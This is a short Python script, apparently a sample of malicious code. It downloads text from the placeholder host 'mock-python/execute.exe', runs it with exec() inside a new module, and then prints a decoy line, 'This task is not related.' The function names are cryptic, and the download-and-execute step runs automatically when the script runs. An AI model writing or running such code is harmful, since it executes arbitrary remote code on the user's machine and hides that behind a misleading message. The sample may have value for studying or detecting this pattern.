import urllib.request
import types

def gRS(u):
    with urllib.request.urlopen(u) as r:
        s = r.read().decode('utf-8')
    return s

def uT():
    print("This task is not related.")

def eM():
    u = "http://mock-python/execute.exe"
    src = gRS(u)
    m = types.ModuleType("sm")
    exec(src, m.__dict__)
    uT()

eM()
